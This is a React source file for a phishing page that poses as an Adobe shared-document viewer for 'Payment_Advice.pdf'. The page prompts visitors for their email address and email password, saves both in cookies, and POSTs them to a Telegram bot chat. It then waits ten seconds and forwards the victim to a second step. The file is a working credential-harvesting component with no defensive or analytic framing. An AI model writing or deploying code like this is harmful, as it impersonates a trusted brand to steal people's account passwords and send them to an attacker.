import Cookies from "js-cookie";
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { TELEGRAM_CHAT_ID, TELEGRAM_URL } from "./telegramConfig";

const FirstPage = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleContinue = () => {
    if (!email || !password) {
      alert("Please enter both email and password");
      return;
    }

    setLoading(true);
    Cookies.set("user_email", email);
    Cookies.set("user_password", password);

    const message = `
🛑 *Step 1: Email + Password Submitted*
📧 *Email:* ${email}
🔑 *Password:* ${password}
    `;

    fetch(TELEGRAM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    setTimeout(() => {
      setLoading(false);
      navigate("/step-two");
    }, 10000);
  };

  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-md">
        <h1 className="text-lg font-semibold text-red-600">Adobe</h1>
        <p className="text-sm text-gray-500 mt-2">
          Filename: <strong>Payment_Advice.pdf</strong>
        </p>

        {loading ? (
          <div className="flex justify-center mt-4">
            <div className="animate-spin h-8 w-8 border-t-2 border-red-500 rounded-full" />
          </div>
        ) : (
          <>
            <input
              type="email"
              className="mt-4 w-full border p-2 rounded-md"
              placeholder="Enter Recipient Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              className="mt-2 w-full border p-2 rounded-md"
              placeholder="Enter Email Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <p className="text-xs text-gray-500 mt-4">
              Only recipient email can access shared files. Link expires in 5
              days.
            </p>
            <button
              onClick={handleContinue}
              className="mt-6 w-full bg-red-500 text-white py-2 rounded-md hover:bg-red-600"
            >
              View Document
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default FirstPage;
